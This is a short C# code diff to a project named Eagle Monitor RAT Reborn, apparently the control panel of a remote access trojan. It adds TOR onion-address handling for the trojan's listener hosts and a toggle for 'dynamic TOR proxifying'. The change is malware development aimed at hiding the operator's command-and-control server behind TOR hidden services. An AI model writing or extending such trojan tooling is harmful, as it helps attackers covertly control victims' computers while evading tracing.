@@ -349,7 +349,14 @@ namespace Eagle_Monitor_RAT_Reborn
         {
             int rowId = Program.mainForm.hostsDataGridView.Rows.Add();
             DataGridViewRow row = Program.mainForm.hostsDataGridView.Rows[rowId];
-            row.Cells["Column22"].Value = dnsGuna2TextBox.Text;
+            if (int.Parse(portGuna2TextBox.Text) == Program.settings.torPort)
+            { 
+                row.Cells["Column22"].Value = Misc.Utils.GrabOnionName();
+                dynamicTorSwitch.Checked = true;
+                dynamicTorSwitch.Enabled = false;
+            }
+            else
+                row.Cells["Column22"].Value = dnsGuna2TextBox.Text;
             row.Cells["Column23"].Value = portGuna2TextBox.Text;
 
             dnsGuna2TextBox.Text = null;
@@ -421,6 +428,7 @@ namespace Eagle_Monitor_RAT_Reborn
                 this.portListView.SelectedItems[0].Remove();
         }
 
+        #region TOR Additions
         private void addToolStripMenuItem_Click(object sender, EventArgs e)
         {
             string p = Microsoft.VisualBasic.Interaction.InputBox("Port :");
@@ -440,5 +448,14 @@ namespace Eagle_Monitor_RAT_Reborn
                     lv.ForeColor = Color.Orange;
             }
         }
+
+        private void dynamicTorSwitch_Click(object sender, EventArgs e)
+        {
+            if (dynamicTorSwitch.Checked)
+                dynamicTorLabel.Text = "Allow dynamic TOR proxifying";
+            else
+                dynamicTorLabel.Text = "TOR proxying disabled";
+        }
+        #endregion TOR Additions
     }
 }
